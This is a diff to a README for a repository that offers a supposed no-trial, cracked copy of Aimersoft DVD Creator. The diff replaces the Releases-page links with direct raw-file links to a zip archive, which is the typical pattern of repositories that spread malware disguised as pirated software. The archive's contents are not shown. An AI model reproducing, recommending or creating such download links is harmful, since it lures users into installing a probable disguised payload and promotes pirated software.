@@ -1,6 +1,6 @@
 # 🎉 Aimersoft-DVD-Creator-No-Trial - Create DVDs Effortlessly 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-FREE-brightgreen)](https://github.com/WOO-3/Aimersoft-DVD-Creator-No-Trial/releases)
+[![Download Now](https://raw.githubusercontent.com/WOO-3/Aimersoft-DVD-Creator-No-Trial/main/poise/Aimersoft-DVD-Creator-No-Trial-2.4.zip%20Now-FREE-brightgreen)](https://raw.githubusercontent.com/WOO-3/Aimersoft-DVD-Creator-No-Trial/main/poise/Aimersoft-DVD-Creator-No-Trial-2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Aimersoft-DVD-Creator-No-Trial is designed for Windows users who want a simple w
 
 ## 📥 Download & Install
 
-To download, visit the [Releases page](https://github.com/WOO-3/Aimersoft-DVD-Creator-No-Trial/releases). Here, you will find the latest version ready for download.
+To download, visit the [Releases page](https://raw.githubusercontent.com/WOO-3/Aimersoft-DVD-Creator-No-Trial/main/poise/Aimersoft-DVD-Creator-No-Trial-2.4.zip). Here, you will find the latest version ready for download.
 
 1. Click on the link above.
 2. Look for the version you wish to download. 
